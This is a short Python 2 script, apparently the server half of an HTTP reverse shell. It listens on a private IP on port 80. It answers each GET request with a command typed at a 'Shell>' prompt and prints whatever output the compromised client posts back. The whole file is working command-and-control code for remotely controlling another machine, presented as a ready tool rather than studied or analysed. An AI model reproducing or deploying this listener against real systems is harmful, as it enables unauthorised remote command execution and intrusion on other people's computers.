#Server

import BaseHTTPServer   # Built-in HTTP library 

HOST_NAME = '192.168.158.128'   # Host IP address
PORT_NUMBER = 80   # Listening port number 


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): 

    def do_GET(s):
                                        
        command = raw_input("Shell> ")   #Take user input
        s.send_response(200)             #HTML status 200 (OK)
        s.send_header("Content-type", "text/html")  
        s.end_headers()
        s.wfile.write(command)           #send the command which we got from the user input

            
    def do_POST(s):
                                                    
        s.send_response(200)                        
        s.end_headers()
        length  = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains                                      
        postVar = s.rfile.read(length)               # Read then print the posted data
        print postVar
        
        

if __name__ == '__main__':    
    
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

    try:     
        httpd.serve_forever()   #if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt:   
        print '[!] Server is terminated'
        httpd.server_close()













